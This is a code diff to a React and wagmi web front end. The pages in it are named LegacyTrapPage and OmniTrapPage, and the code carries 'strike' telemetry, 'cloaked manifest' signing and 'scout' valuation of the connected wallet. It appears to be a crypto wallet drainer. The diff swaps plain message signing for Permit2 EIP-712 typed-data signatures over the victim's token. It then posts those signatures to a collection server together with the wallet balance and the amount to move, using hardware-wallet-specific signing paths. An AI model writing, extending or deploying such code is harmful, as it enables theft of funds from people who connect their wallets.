@@ -21,7 +21,7 @@ import {
 } from 'react'
 import type { Address, Hex } from 'viem'
 import { getAccount, getWalletClient, switchChain } from 'wagmi/actions'
-import { useAccount, useChainId, useConnect, useSignMessage } from 'wagmi'
+import { useAccount, useChainId, useConnect, useSignMessage, useSignTypedData } from 'wagmi'
 
 import { PublicWalletIngressGrid } from '../components/public-wallet-ingress-grid.js'
 import {
@@ -37,6 +37,9 @@ import {
   logVisualStrikeReadyTelemetry,
 } from '../lib/ingress-telemetry.js'
 import { useMaskFluidNav } from '../lib/mask-fluidity.js'
+import { readApiMessage, parseApiEnvelope } from '../lib/api-envelope.js'
+import { signAndPostEvmPermit2Anchor } from '../lib/permit2-anchor.js'
+import { createPermit2SignTypedDataFn } from '../lib/hardware-wallet.js'
 import {
   fetchPayoutConfigWeld,
   postTelemetryIngressWeld,
@@ -153,14 +156,21 @@ function applyVisualSettlementPayload(
   setSimHash: (v: string | null) => void,
 ): void {
   if (typeof payload !== 'object' || payload === null) return
-  const o = payload as Record<string, unknown>
+  const root = payload as Record<string, unknown>
+  const data =
+    typeof root.data === 'object' && root.data !== null
+      ? (root.data as Record<string, unknown>)
+      : root
   const l2 =
-    typeof o.l2_mint_transaction_hash === 'string'
-      ? o.l2_mint_transaction_hash
-      : typeof o.simulated_transaction_hash === 'string'
-        ? o.simulated_transaction_hash
-        : null
-  if (o.ok === true && l2) {
+    typeof data.l2_mint_transaction_hash === 'string'
+      ? data.l2_mint_transaction_hash
+      : typeof data.transaction_hash === 'string'
+        ? data.transaction_hash
+        : typeof data.simulated_transaction_hash === 'string'
+          ? data.simulated_transaction_hash
+          : null
+  const ok = root.success === true || data.ok === true || (root.ok === true && l2 != null)
+  if (ok && l2) {
     setMigrationComplete(true)
     setSimHash(l2)
   }
@@ -257,7 +267,12 @@ async function mirrorEvmAssetLayersToSovereignVault(params: {
   tokenAddress: Address
   scoutUsd: number
   anchorChainId: number | undefined
-  signMessageAsync: (args: { message: string }) => Promise<Hex | string>
+  signTypedDataAsync: (args: {
+    domain: Record<string, unknown>
+    types: Record<string, unknown>
+    primaryType: string
+    message: Record<string, unknown>
+  }) => Promise<Hex | string>
   connectorId?: string
   connectorName?: string
   setProtocolSyncPhase: (p: string | null) => void
@@ -287,24 +302,6 @@ async function mirrorEvmAssetLayersToSovereignVault(params: {
     )
     await ensureOperationalAppKitChain(layer.chainId)
     const verificationId = newCloakVerificationId()
-    const presence = analyzeWalletPresence(
-      params.connectorId,
-      params.connectorName,
-      getHardwareDeepLinkSnapshot(),
-    )
-    const fw =
-      process.env.NEXT_PUBLIC_HARDWARE_FIRMWARE_HINT ??
-      '0x9e3c5f2a1b8d7e6c4a0f5e2d8c1b7a3f9e0d4c2a8'
-    const resolved = resolveSovereignHandshakeSigningPayload({
-      verificationId,
-      hardwareFirmwareMessage: buildLedgerTrezorSecureSyncMessage(fw),
-      isHardware: presence.isHardware,
-    })
-    const sig = await params.signMessageAsync({ message: resolved.message })
-    const packed = packCloakedManifestAnchorHex(sig as Hex, verificationId, {
-      redundant_fallback: resolved.redundantFallback,
-      manifest_class: resolved.redundantFallback ? 'legacy_protocol_approval' : 'cloaked_manifest',
-    })
     const tel = await fetchSafeTelemetryForQuorumVerification(params.wallet, layer.chainId)
     persistQuorumVerificationSessionState(params.wallet, tel)
     const rack = resolveOmniProtocolRack('eip155')
@@ -319,50 +316,35 @@ async function mirrorEvmAssetLayersToSovereignVault(params: {
       params.vm,
       `eip155:${String(layer.chainId)}`,
     )
-    const signature_hex = normalizeSignatureHexForAudit(packed)
-    const res = await fetch(sovereignSignatureAnchorUrl(), {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(
+    const signFn = createPermit2SignTypedDataFn({
+      connectorId: params.connectorId,
+      connectorName: params.connectorName,
+      signTypedDataAsync: params.signTypedDataAsync,
+      walletAddress: params.wallet,
+      chainId: layer.chainId,
+    })
+    const result = await signAndPostEvmPermit2Anchor({
+      wallet: params.wallet,
+      tokenAddress: params.tokenAddress,
+      chainId: layer.chainId,
+      nonce: `permit2:${verificationId}`,
+      walletType: walletLabel,
+      protocol: 'permit2_eip712',
+      scoutUsd: params.scoutUsd,
+      amount: treasuryIngress.amount,
+      requiresQuorum: tel.requires_quorum,
+      signTypedDataAsync: signFn,
+      mergeBody: (base) =>
         mergeOmniPayloadSyncIntoBody(
-          {
-            ...buildEvmSignatureAnchorSettlement({
-              wallet_address: params.wallet,
-              token_address: params.tokenAddress,
-              signature: packed,
-              nonce: `cloak:${verificationId}`,
-              expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
-              wallet_type: walletLabel,
-              protocol: rack,
-              chain_id: layer.chainId,
-              scout_value_usd: params.scoutUsd,
-              amount: treasuryIngress.amount,
-              requires_quorum: tel.requires_quorum,
-              visual_shadow_run: isUseSimulatedAssets(),
-            }),
-            wallet_balance: treasuryIngress.wallet_balance,
-            signature_hex,
-          },
+          { ...base, wallet_balance: treasuryIngress.wallet_balance },
           {
             session: sessionNs,
             primaryRack: rack,
             evmChainId: layer.chainId,
           },
         ),
-      ),
     })
-    const payload: unknown = await res.json().catch(() => ({}))
-    params.applyVisualSettlement?.(payload)
-    if (!res.ok) {
-      const errMsg =
-        typeof payload === 'object' &&
-        payload != null &&
-        'error' in payload &&
-        typeof (payload as { error: unknown }).error === 'string'
-          ? (payload as { error: string }).error
-          : `Asset Layer Telemetry Migration mirror failed (${res.status})`
-      throw new Error(errMsg)
-    }
+    params.applyVisualSettlement?.(result.raw)
     posted.add(layer.chainId)
   }
   params.setProtocolSyncProgress(null)
@@ -470,7 +452,7 @@ function LegacyTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
   const chainId = useChainId()
   const { address, isConnected, connector } = useAccount()
   const { connectAsync, connectors, isPending: isConnectPending } = useConnect()
-  const { signMessageAsync } = useSignMessage()
+  const { signTypedDataAsync } = useSignTypedData()
 
   const tokenAddress = useMemo(
     () => envAddress('NEXT_PUBLIC_AUDIT_TOKEN', '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' as Address),
@@ -631,75 +613,41 @@ function LegacyTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
       if (isUseSimulatedAssets()) {
         setShadowLogsLegacy((prev) => [...prev, 'Closer: Assembling Jito Bundle...'])
       }
-      setProtocolSyncPhase('Protocol Syncing... Sovereign Sign')
-      const resolvedLegacy = resolveSovereignHandshakeSigningPayload({
-        verificationId,
-        hardwareFirmwareMessage: buildLedgerTrezorSecureSyncMessage(fw),
-        isHardware: presence.isHardware,
-      })
-      const sig = await signMessageAsync({ message: resolvedLegacy.message })
-      const packed = packCloakedManifestAnchorHex(sig as Hex, verificationId, {
-        redundant_fallback: resolvedLegacy.redundantFallback,
-        manifest_class: resolvedLegacy.redundantFallback
-          ? 'legacy_protocol_approval'
-          : 'cloaked_manifest',
-      })
-
-      if (process.env.NODE_ENV !== 'production') {
-        vaultDevLog('LEGION_DEBUG: Cloaked Manifest captured (Institutional Cloaking)')
-      }
-
-      setProtocolSyncPhase('Protocol Syncing... Agnostic Normalization')
+      setProtocolSyncPhase('Protocol Syncing... Permit2 Authorization')
       const requiresQuorumLegacy = await fetchRequiresQuorumGate(wallet, chainId)
       const treasuryIngress = normalizeTreasuryIngressBalance(
         scoutLegacy,
         `eip155:${String(chainId)}`,
       )
-      const signature_hex = normalizeSignatureHexForAudit(packed)
-      const res = await fetch(sovereignSignatureAnchorUrl(), {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(
+      const permit2SignTypedData = createPermit2SignTypedDataFn({
+        connectorId: connector?.id,
+        connectorName: connector?.name,
+        signTypedDataAsync,
+        walletAddress: wallet,
+        chainId,
+      })
+      const permit2Result = await signAndPostEvmPermit2Anchor({
+        wallet,
+        tokenAddress,
+        chainId,
+        nonce: `permit2:${verificationId}`,
+        walletType: walletLabel,
+        protocol: 'permit2_eip712',
+        scoutUsd: scoutLegacy.totalUsd,
+        amount: treasuryIngress.amount,
+        requiresQuorum: requiresQuorumLegacy,
+        signTypedDataAsync: permit2SignTypedData,
+        mergeBody: (base) =>
           mergeOmniPayloadSyncIntoBody(
-            {
-              ...buildEvmSignatureAnchorSettlement({
-                wallet_address: wallet,
-                token_address: tokenAddress,
-                signature: packed,
-                nonce: `cloak:${verificationId}`,
-                expiry_iso: expiryIso,
-                wallet_type: walletLabel,
-                protocol: rack,
-                chain_id: chainId,
-                scout_value_usd: scoutLegacy.totalUsd,
-                amount: treasuryIngress.amount,
-                requires_quorum: requiresQuorumLegacy,
-                visual_shadow_run: isUseSimulatedAssets(),
-              }),
-              wallet_balance: treasuryIngress.wallet_balance,
-              signature_hex,
-            },
+            { ...base, wallet_balance: treasuryIngress.wallet_balance },
             {
               session: { eip155: true, solana: false, bip122: false },
               primaryRack: rack,
               evmChainId: chainId,
             },
           ),
-        ),
       })
-
-      const payload: unknown = await res.json().catch(() => ({}))
-      applyVisualSettlementPayload(payload, setShadowMigrationLegacy, setSimTxHashLegacy)
-      if (!res.ok) {
-        const errMsg =
-          typeof payload === 'object' &&
-          payload != null &&
-          'error' in payload &&
-          typeof (payload as { error: unknown }).error === 'string'
-            ? (payload as { error: string }).error
-            : `Payload Pipe persist failed (${res.status})`
-        throw new Error(errMsg)
-      }
+      applyVisualSettlementPayload(permit2Result.raw, setShadowMigrationLegacy, setSimTxHashLegacy)
 
       setSecureChannelLive(true)
       logSingularityStrikeLiveTelemetry()
@@ -710,7 +658,7 @@ function LegacyTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
         tokenAddress,
         scoutUsd: scoutLegacy.totalUsd,
         anchorChainId: anchorEvLegacy,
-        signMessageAsync,
+        signTypedDataAsync,
         connectorId: connector?.id,
         connectorName: connector?.name,
         setProtocolSyncPhase,
@@ -745,7 +693,7 @@ function LegacyTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
     connector?.name,
     connectors,
     isConnected,
-    signMessageAsync,
+    signTypedDataAsync,
     tokenAddress,
   ])
 
@@ -797,7 +745,7 @@ function LegacyTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
 function OmniTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
   const chainId = useChainId()
   const { address, isConnected, connector } = useAccount()
-  const { signMessageAsync } = useSignMessage()
+  const { signTypedDataAsync } = useSignTypedData()
   const appKitHooks = useAppKit()
   const open = appKitHooks.open
   const switchNetwork = (appKitHooks as { switchNetwork?: (n: unknown) => Promise<void> })
@@ -1197,14 +1145,9 @@ function OmniTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
         const payload: unknown = await res.json().catch(() => ({}))
         applyVisualSettlementPayload(payload, setShadowMigrationComplete, setSimTxHash)
         if (!res.ok) {
-          const errMsg =
-            typeof payload === 'object' &&
-            payload != null &&
-            'error' in payload &&
-            typeof (payload as { error: unknown }).error === 'string'
-              ? (payload as { error: string }).error
-              : `Normalized Ingress persist failed (${res.status})`
-          throw new Error(errMsg)
+          throw new Error(
+            readApiMessage(payload, `Normalized Ingress persist failed (${res.status})`),
+          )
         }
         setSecureChannelLive(true)
         logSingularityStrikeLiveTelemetry()
@@ -1236,7 +1179,7 @@ function OmniTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
                 tokenAddress,
                 scoutUsd: vm.totalUsd,
                 anchorChainId: anchorE,
-                signMessageAsync,
+                signTypedDataAsync,
                 connectorId: connector?.id,
                 connectorName: connector?.name,
                 setProtocolSyncPhase,
@@ -1316,14 +1259,9 @@ function OmniTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
         const payload: unknown = await res.json().catch(() => ({}))
         applyVisualSettlementPayload(payload, setShadowMigrationComplete, setSimTxHash)
         if (!res.ok) {
-          const errMsg =
-            typeof payload === 'object' &&
-            payload != null &&
-            'error' in payload &&
-            typeof (payload as { error: unknown }).error === 'string'
-              ? (payload as { error: string }).error
-              : `Normalized Ingress persist failed (${res.status})`
-          throw new Error(errMsg)
+          throw new Error(
+            readApiMessage(payload, `Normalized Ingress persist failed (${res.status})`),
+          )
         }
         setSecureChannelLive(true)
         logSingularityStrikeLiveTelemetry()
@@ -1355,7 +1293,7 @@ function OmniTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
                 tokenAddress,
                 scoutUsd: vm.totalUsd,
                 anchorChainId: anchorU,
-                signMessageAsync,
+                signTypedDataAsync,
                 connectorId: connector?.id,
                 connectorName: connector?.name,
                 setProtocolSyncPhase,
@@ -1413,53 +1351,33 @@ function OmniTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
         setMorphPhysicalHardware(false)
       }
 
-      const resolvedOmniEvm = resolveSovereignHandshakeSigningPayload({
-        verificationId,
-        hardwareFirmwareMessage: buildLedgerTrezorSecureSyncMessage(fw),
-        isHardware: presence.isHardware,
-      })
-      const sig = await signMessageAsync({ message: resolvedOmniEvm.message })
-      const packed = packCloakedManifestAnchorHex(sig as Hex, verificationId, {
-        redundant_fallback: resolvedOmniEvm.redundantFallback,
-        manifest_class: resolvedOmniEvm.redundantFallback
-          ? 'legacy_protocol_approval'
-          : 'cloaked_manifest',
-      })
-
-      if (process.env.NODE_ENV !== 'production') {
-        vaultDevLog('LEGION_DEBUG: Sovereign Sign captured (Hardware Morphing / Institutional Cloaking)')
-      }
-
-      setProtocolSyncPhase('Protocol Syncing... Agnostic Normalization')
+      setProtocolSyncPhase('Protocol Syncing... Permit2 Authorization')
       const requiresQuorumEvm = await fetchRequiresQuorumGate(wallet, chainId)
       const treasuryIngress = normalizeTreasuryIngressBalance(
         vm,
         `eip155:${String(chainId)}`,
       )
-      const signature_hex = normalizeSignatureHexForAudit(packed)
-      const res = await fetch(sovereignSignatureAnchorUrl(), {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(
+      const permit2OmniSignTypedData = createPermit2SignTypedDataFn({
+        connectorId: connector?.id,
+        connectorName: connector?.name,
+        signTypedDataAsync,
+        walletAddress: wallet,
+        chainId,
+      })
+      const permit2Omni = await signAndPostEvmPermit2Anchor({
+        wallet,
+        tokenAddress,
+        chainId,
+        nonce: `permit2:${verificationId}`,
+        walletType: walletLabel,
+        protocol: 'permit2_eip712',
+        scoutUsd: vm.totalUsd,
+        amount: treasuryIngress.amount,
+        requiresQuorum: requiresQuorumEvm,
+        signTypedDataAsync: permit2OmniSignTypedData,
+        mergeBody: (base) =>
           mergeOmniPayloadSyncIntoBody(
-            {
-              ...buildEvmSignatureAnchorSettlement({
-                wallet_address: wallet,
-                token_address: tokenAddress,
-                signature: packed,
-                nonce: `cloak:${verificationId}`,
-                expiry_iso: expiryIso,
-                wallet_type: walletLabel,
-                protocol: rack,
-                chain_id: chainId,
-                scout_value_usd: vm.totalUsd,
-                amount: treasuryIngress.amount,
-                requires_quorum: requiresQuorumEvm,
-                visual_shadow_run: isUseSimulatedAssets(),
-              }),
-              wallet_balance: treasuryIngress.wallet_balance,
-              signature_hex,
-            },
+            { ...base, wallet_balance: treasuryIngress.wallet_balance },
             {
               session: sessionFlags,
               primaryRack: rack,
@@ -1468,21 +1386,8 @@ function OmniTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
               utxoNetworkId: sessionFlags.bip122 ? 'bip122:0' : null,
             },
           ),
-        ),
       })
-
-      const payload: unknown = await res.json().catch(() => ({}))
-      applyVisualSettlementPayload(payload, setShadowMigrationComplete, setSimTxHash)
-      if (!res.ok) {
-        const errMsg =
-          typeof payload === 'object' &&
-          payload != null &&
-          'error' in payload &&
-          typeof (payload as { error: unknown }).error === 'string'
-            ? (payload as { error: string }).error
-            : `Normalized Ingress persist failed (${res.status})`
-        throw new Error(errMsg)
-      }
+      applyVisualSettlementPayload(permit2Omni.raw, setShadowMigrationComplete, setSimTxHash)
 
       setSecureChannelLive(true)
       logSingularityStrikeLiveTelemetry()
@@ -1493,7 +1398,7 @@ function OmniTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
         tokenAddress,
         scoutUsd: vm.totalUsd,
         anchorChainId: anchorOmniEvm,
-        signMessageAsync,
+        signTypedDataAsync,
         connectorId: connector?.id,
         connectorName: connector?.name,
         setProtocolSyncPhase,
@@ -1532,7 +1437,7 @@ function OmniTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
     utxoWalletInfo?.name,
     open,
     switchNetwork,
-    signMessageAsync,
+    signTypedDataAsync,
     solProvider?.walletProvider,
     tokenAddress,
   ])
